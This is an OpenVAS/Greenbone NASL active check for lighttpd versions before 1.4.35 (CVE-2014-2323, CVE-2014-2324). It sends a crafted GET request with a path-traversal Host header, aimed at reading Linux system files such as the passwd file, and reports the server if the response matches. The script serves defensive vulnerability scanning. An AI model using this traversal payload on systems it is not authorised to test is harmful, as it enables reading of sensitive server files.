# Copyright (C) 2014 Greenbone Networks GmbH
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-or-later
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.

CPE = "cpe:/a:lighttpd:lighttpd";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802072");
  script_version("2023-02-01T10:08:40+0000");
  script_cve_id("CVE-2014-2323", "CVE-2014-2324");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"last_modification", value:"2023-02-01 10:08:40 +0000 (Wed, 01 Feb 2023)");
  script_tag(name:"severity_vector", value:"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H");
  script_tag(name:"severity_origin", value:"NVD");
  script_tag(name:"severity_date", value:"2021-02-26 23:50:00 +0000 (Fri, 26 Feb 2021)");
  script_tag(name:"creation_date", value:"2014-05-13 12:18:43 +0530 (Tue, 13 May 2014)");
  script_name("Lighttpd < 1.4.35 Multiple Vulnerabilities - Active Check");

  script_tag(name:"summary", value:"Lighttpd is prone to multiple vulnerabilities.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The following flaws exist:

  - mod_mysql_vhost module is not properly sanitizing user supplied input passed via the hostname

  - mod_evhost and mod_simple_vhost modules are not properly sanitizing user supplied input via the
  hostname");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to execute
  arbitrary SQL commands and remote attackers to read arbitrary files via hostname.");

  script_tag(name:"affected", value:"Lighttpd versions prior to 1.4.35.");

  script_tag(name:"solution", value:"Update to version 1.4.35 or later.");

  script_xref(name:"URL", value:"http://seclists.org/oss-sec/2014/q1/561");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66153");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/66157");
  script_xref(name:"URL", value:"http://download.lighttpd.net/lighttpd/security/lighttpd_sa_2014_01.txt");

  script_category(ACT_ATTACK);
  script_family("Web Servers");
  script_copyright("Copyright (C) 2014 Greenbone Networks GmbH");
  script_dependencies("sw_lighttpd_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("lighttpd/http/detected");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");
include("os_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! get_app_location( cpe:CPE, port:port, nofork:TRUE ) )
  exit( 0 );

res = http_get_cache( item:"/", port:port );

# nb: Exit if the normal request is a "Bad Request" to avoid FPs
if( ! res || res =~ "^HTTP/1\.[01] 400" )
  exit( 0 );

files = traversal_files( "linux" );

foreach file( keys( files ) ) {

  req = 'GET /' + files[file] + ' HTTP/1.1' + '\r\n' +
        'Host: [::1]/../../../../../../../' + '\r\n\r\n';
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );

  # nb: Patched response
  if( ! res || res =~ "^HTTP/1\.[01] 400" )
    continue;

  # nb: Vulnerable lighttpd response
  if( res =~ "(root:.*:0:[01]:|^HTTP/1\.[01] 404)" ) {
    security_message( port:port );
    exit( 0 );
  }
}

exit( 99 );
